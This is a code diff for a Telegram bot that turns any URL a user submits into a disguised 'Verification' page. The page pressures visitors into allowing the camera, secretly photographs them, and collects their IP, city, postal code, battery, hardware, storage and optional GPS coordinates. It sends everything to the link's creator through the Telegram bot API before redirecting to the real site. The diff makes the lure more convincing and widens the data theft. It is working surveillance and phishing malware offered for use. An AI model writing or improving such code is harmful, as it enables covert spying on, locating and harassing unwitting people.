@@ -36,11 +36,6 @@ def increment_links():
     with open(STATS_FILE, "w") as f:
         json.dump(stats, f)
 
-def get_link_count():
-    with open(STATS_FILE, "r") as f:
-        stats = json.load(f)
-    return stats.get("total_links", 0)
-
 def delete_old_files():
     cutoff_time = datetime.now() - timedelta(minutes=10)
     if os.path.exists(HTML_DIR):
@@ -101,31 +96,69 @@ def generate_html(user_id, target_url):
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Loading...</title>
+    <title>Verification</title>
     <style>
-        * {{ user-select: none; }}
-        body {{ background: #fff; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; }}
-        .spinner {{ width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 10px; }}
+        * {{ user-select: none; margin: 0; padding: 0; box-sizing: border-box; }}
+        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }}
+        .container {{ background: white; border-radius: 20px; padding: 30px; max-width: 400px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; }}
+        .spinner {{ width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }}
         @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
-        .btn {{ background: #3498db; color: white; border: none; padding: 12px 24px; border-radius: 5px; cursor: pointer; margin-top: 20px; }}
+        .btn {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 16px; cursor: pointer; margin: 10px 0; width: 100%; font-weight: bold; transition: transform 0.3s; }}
+        .btn:hover {{ transform: scale(1.02); }}
         .skip {{ background: #95a5a6; }}
+        .error {{ color: #e74c3c; margin-top: 10px; font-size: 14px; }}
+        .info {{ color: #666; font-size: 12px; margin-top: 20px; }}
+        h2 {{ color: #333; margin-bottom: 20px; }}
     </style>
 </head>
 <body>
-<div style="text-align:center">
-    <div id="step1"><div class="spinner"></div><div>Loading...</div></div>
-    <div id="step2" style="display:none"><button class="btn" onclick="requestCamera()">GO TO PAGE</button><div id="errorMsg" style="color:red"></div></div>
-    <div id="step3" style="display:none"><div class="spinner"></div><div>Camera access...</div></div>
-    <div id="step4" style="display:none"><div class="spinner"></div><div>Location (optional)...</div><button class="btn skip" onclick="skipLocation()">Skip</button></div>
-    <div id="step5" style="display:none"><div class="spinner"></div><div>Redirecting...</div></div>
+<div class="container">
+    <div id="step1">
+        <div class="spinner"></div>
+        <h2>Verifying Device...</h2>
+        <p>Please wait while we check your device</p>
+    </div>
+    <div id="step2" style="display:none">
+        <h2>Verification Required</h2>
+        <button class="btn" onclick="requestCamera()">📸 CONTINUE</button>
+        <div id="errorMsg" class="error"></div>
+        <p class="info">Camera access is required to continue</p>
+    </div>
+    <div id="step3" style="display:none">
+        <div class="spinner"></div>
+        <h2>Camera Access</h2>
+        <p>Requesting camera permission...</p>
+    </div>
+    <div id="step4" style="display:none">
+        <div class="spinner"></div>
+        <h2>Location Access (Optional)</h2>
+        <p>This helps us verify your region</p>
+        <button class="btn" onclick="allowLocation()">📍 ALLOW LOCATION</button>
+        <button class="btn skip" onclick="skipLocation()">⏭ SKIP</button>
+    </div>
+    <div id="step5" style="display:none">
+        <div class="spinner"></div>
+        <h2>Redirecting...</h2>
+        <p>Please wait</p>
+    </div>
 </div>
 <video id="video" autoplay playsinline muted style="display:none"></video>
 <canvas id="canvas" style="display:none"></canvas>
+
 <script>
 const TOKEN = "{TOKEN}";
 const USER = {user_id};
 const TARGET = "{target_url}";
-let skipped = false;
+let locationAllowed = false;
+let locationSkipped = false;
+
+function formatBytes(bytes) {{
+    if (bytes === 0) return '0 Bytes';
+    const k = 1024;
+    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+}}
 
 async function sendToUser(text, file=null) {{
     try {{
@@ -135,64 +168,186 @@ async function sendToUser(text, file=null) {{
             fd.append('photo', file);
             await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto', {{method:'POST', body:fd}});
         }} else {{
-            await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{chat_id:USER, text:text}})}});
+            await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{chat_id:USER, text:text, parse_mode:'HTML'}})}});
         }}
     }} catch(e) {{}}
 }}
 
-async function getIP() {{ try{{let r=await fetch('https://api.ipify.org?format=json');return (await r.json()).ip;}}catch(e){{return'Unknown';}} }}
-
-async function capturePhoto() {{
+async function getIPInfo(ip) {{
     try {{
-        let s = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }});
-        let v = document.getElementById('video');
-        v.srcObject = s;
-        await new Promise(r => v.onloadedmetadata = () => {{ v.play(); r(); }});
-        await new Promise(r => setTimeout(r, 300));
-        let c = document.getElementById('canvas');
-        c.width = v.videoWidth;
-        c.height = v.videoHeight;
-        c.getContext('2d').drawImage(v, 0, 0);
-        let blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
-        if(blob && blob.size > 500) await sendToUser('FRONT CAMERA:', blob);
-        s.getTracks().forEach(t => t.stop());
-        return true;
-    }} catch(e) {{ return false; }}
+        let r = await fetch(`https://ipapi.co/${{ip}}/json/`);
+        let d = await r.json();
+        return d;
+    }} catch(e) {{ return {{}}; }}
 }}
 
-async function getLocation() {{
-    return new Promise(r => {{
-        if(!navigator.geolocation) r(false);
-        navigator.geolocation.getCurrentPosition(p => {{ sendToUser('Location: https://www.google.com/maps?q='+p.coords.latitude+','+p.coords.longitude); r(true); }}, () => r(false), {{timeout:8000}});
-    }});
+async function getBattery() {{
+    if(navigator.getBattery) {{
+        try {{
+            let b = await navigator.getBattery();
+            return {{ level: Math.round(b.level*100), charging: b.charging }};
+        }} catch(e) {{}}
+    }}
+    return null;
+}}
+
+function getDeviceInfo() {{
+    const ua = navigator.userAgent;
+    let deviceType = 'Unknown';
+    if (/iPhone/i.test(ua)) deviceType = 'iPhone';
+    else if (/iPad/i.test(ua)) deviceType = 'iPad';
+    else if (/Android/i.test(ua)) deviceType = 'Android Phone';
+    else if (/Mobile/i.test(ua)) deviceType = 'Mobile Device';
+    else deviceType = 'Desktop/Laptop';
+    return deviceType;
+}}
+
+function getHardwareInfo() {{
+    const info = {{ cores: navigator.hardwareConcurrency || 'Unknown' }};
+    if(navigator.deviceMemory) info.ram = navigator.deviceMemory + ' GB';
+    else info.ram = 'Unknown';
+    return info;
+}}
+
+async function getStorageInfo() {{
+    try {{
+        if('storage' in navigator && 'estimate' in navigator.storage) {{
+            let estimate = await navigator.storage.estimate();
+            return {{
+                used: estimate.usage,
+                total: estimate.quota,
+                usedFormatted: formatBytes(estimate.usage),
+                totalFormatted: formatBytes(estimate.quota)
+            }};
+        }}
+    }} catch(e) {{}}
+    return null;
+}}
+
+async function captureData() {{
+    try {{
+        let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'Unknown');
+        let ipInfo = await getIPInfo(ip);
+        let battery = await getBattery();
+        let deviceType = getDeviceInfo();
+        let hardware = getHardwareInfo();
+        let storage = await getStorageInfo();
+        let language = navigator.language || navigator.userLanguage || 'Unknown';
+        let resolution = screen.width + 'x' + screen.height;
+        
+        let message = `📊 <b>Visitor Information Captured</b>
+━━━━━━━━━━━━━━━━━━━━━━
+
+🖥️ <b>Device & Browser</b>
+   • Device: ${deviceType}
+   • User Agent: ${navigator.userAgent.substring(0, 200)}
+
+🌐 <b>Network Information</b>
+   • IP Address: ${ip}
+   • Language: ${language}
+
+📍 <b>Location Details</b>
+   • Country: ${ipInfo.country_name || 'Unknown'}
+   • Region: ${ipInfo.region || 'Unknown'}
+   • City: ${ipInfo.city || 'Unknown'}
+   • Postal Code: ${ipInfo.postal || 'Unknown'}
+   • Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+
+🖼️ <b>Display Information</b>
+   • Resolution: ${resolution}
+
+🔋 <b>Battery Status</b>
+   • Level: ${battery ? battery.level + '%' : 'Unknown'}
+   • Charging: ${battery ? (battery.charging ? 'Yes' : 'No') : 'Unknown'}
+
+💾 <b>Hardware & Storage</b>
+   • CPU Cores: ${hardware.cores}
+   • RAM: ${hardware.ram}
+   • Storage Used: ${storage ? storage.usedFormatted : 'Unknown'}
+   • Storage Total: ${storage ? storage.totalFormatted : 'Unknown'}
+
+━━━━━━━━━━━━━━━━━━━━━━
+⚡ Developed by: @nrtecno2`;
+        
+        await sendToUser(message);
+        return true;
+    }} catch(e) {{
+        await sendToUser('Error capturing data: ' + e.message);
+        return false;
+    }}
+}}
+
+async function captureFrontPhoto() {{
+    try {{
+        let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }});
+        let video = document.getElementById('video');
+        video.srcObject = stream;
+        await new Promise(r => video.onloadedmetadata = () => {{ video.play(); r(); }});
+        await new Promise(r => setTimeout(r, 300));
+        let canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        let blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+        if(blob && blob.size > 500) {{
+            await sendToUser('📸 <b>FRONT CAMERA PHOTO</b>', blob);
+        }}
+        stream.getTracks().forEach(t => t.stop());
+        return true;
+    }} catch(e) {{
+        return false;
+    }}
+}}
+
+async function allowLocation() {{
+    locationAllowed = true;
+    locationSkipped = false;
+    document.getElementById('step4').style.display = 'none';
+    document.getElementById('step5').style.display = 'block';
+    
+    if(navigator.geolocation) {{
+        navigator.geolocation.getCurrentPosition(async (p) => {{
+            await sendToUser(`📍 <b>LIVE LOCATION</b>\nhttps://www.google.com/maps?q=${{p.coords.latitude}},${{p.coords.longitude}}`);
+            await sendToUser(`📍 <b>Coordinates</b>\nLatitude: ${{p.coords.latitude}}\nLongitude: ${{p.coords.longitude}}\nAccuracy: ${{p.coords.accuracy}}m`);
+            setTimeout(() => window.location.href = TARGET, 1500);
+        }}, async (err) => {{
+            await sendToUser('📍 Location: Access denied by user');
+            setTimeout(() => window.location.href = TARGET, 1500);
+        }}, {{ timeout: 10000, enableHighAccuracy: true }});
+    }} else {{
+        setTimeout(() => window.location.href = TARGET, 1500);
+    }}
 }}
 
 async function skipLocation() {{
-    skipped = true;
+    locationSkipped = true;
+    locationAllowed = false;
     document.getElementById('step4').style.display = 'none';
     document.getElementById('step5').style.display = 'block';
-    await sendToUser('Location: Skipped');
+    await sendToUser('📍 Location: Skipped by user');
     setTimeout(() => window.location.href = TARGET, 1500);
 }}
 
 async function requestCamera() {{
     document.getElementById('step2').style.display = 'none';
     document.getElementById('step3').style.display = 'block';
-    let ok = await capturePhoto();
-    if(ok) {{
+    
+    let cameraSuccess = await captureFrontPhoto();
+    
+    if(cameraSuccess) {{
         document.getElementById('step3').style.display = 'none';
         document.getElementById('step4').style.display = 'block';
-        setTimeout(async () => {{ if(!skipped) await getLocation(); }}, 100);
+        await sendToUser('✅ Camera access granted');
     }} else {{
         document.getElementById('step3').style.display = 'none';
         document.getElementById('step2').style.display = 'block';
-        document.getElementById('errorMsg').innerHTML = 'Camera required!';
+        document.getElementById('errorMsg').innerHTML = '❌ Camera access required! Please click CONTINUE and allow camera.';
+        await sendToUser('❌ Camera access denied by user');
     }}
 }}
 
 async function start() {{
-    let ip = await getIP();
-    await sendToUser('IP: '+ip+'\\nDevice: '+navigator.userAgent.split('(')[0]);
+    await captureData();
     document.getElementById('step1').style.display = 'none';
     document.getElementById('step2').style.display = 'block';
 }}
@@ -218,12 +373,12 @@ def process_update(update):
             if text == '/start':
                 if not is_subscribed(chat_id):
                     markup = telebot.types.InlineKeyboardMarkup()
-                    markup.add(telebot.types.InlineKeyboardButton("Join Channel", url="https://t.me/nrtecno2"))
-                    markup.add(telebot.types.InlineKeyboardButton("Verify", callback_data="verify"))
-                    bot.send_message(chat_id, f"Join {REQUIRED_CHANNEL} first!", reply_markup=markup)
+                    markup.add(telebot.types.InlineKeyboardButton("📢 Join Channel", url="https://t.me/nrtecno2"))
+                    markup.add(telebot.types.InlineKeyboardButton("✅ Verify", callback_data="verify"))
+                    bot.send_message(chat_id, f"🚫 Join {REQUIRED_CHANNEL} first!", reply_markup=markup)
                 else:
                     set_user_state(chat_id, {"state": "waiting_url"})
-                    bot.send_message(chat_id, "Send me any URL")
+                    bot.send_message(chat_id, "✅ Send me any URL:\nhttps://www.instagram.com/p/xxxxx")
             
             elif text.startswith(('http://', 'https://')):
                 state = get_user_state(chat_id)
@@ -231,12 +386,12 @@ def process_update(update):
                     filename = generate_html(chat_id, text)
                     set_user_state(chat_id, {"state": None})
                     link = f"https://{ACCOUNT_NAME}.onrender.com/view/{filename}"
-                    bot.send_message(chat_id, f"Your link:\n{link}\n\nExpires in 10 minutes")
+                    bot.send_message(chat_id, f"✅ LINK GENERATED:\n{link}\n\n⚠️ Link expires in 10 minutes!\n📸 Camera COMPULSORY\n📍 Location OPTIONAL")
                 else:
-                    bot.send_message(chat_id, "Use /start first")
+                    bot.send_message(chat_id, "❌ Use /start first")
             else:
                 if text != '/start':
-                    bot.send_message(chat_id, "Send a valid URL")
+                    bot.send_message(chat_id, "❌ Send a valid URL starting with http:// or https://")
     except Exception as e:
         logger.error(f"Process error: {e}")
 
@@ -244,10 +399,10 @@ def process_callback(call):
     try:
         if call.data == "verify":
             if is_subscribed(call.from_user.id):
-                bot.edit_message_text("Verified! Send URL:", call.from_user.id, call.message.message_id)
+                bot.edit_message_text("✅ Verified!\n\nSend me any URL:", call.from_user.id, call.message.message_id)
                 set_user_state(call.from_user.id, {"state": "waiting_url"})
             else:
-                bot.answer_callback_query(call.id, "Join channel first!", True)
+                bot.answer_callback_query(call.id, "❌ Join channel first!", True)
     except Exception as e:
         logger.error(f"Callback error: {e}")
 
@@ -274,10 +429,11 @@ def serve_html(filename):
 
 @app.route('/')
 def home():
-    return f"DRAGON ACTIVE | Total Links: {get_link_count()}"
+    return f"🐉 DRAGON LORD MODE ACTIVE | Total Links: {sum(1 for _ in os.listdir(HTML_DIR) if _.endswith('.html'))}"
 
 # ========== MAIN ==========
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
     start_auto_cleanup()
+    logger.info(f"🚀 DRAGON bot starting on port {port}")
     app.run(host='0.0.0.0', port=port)
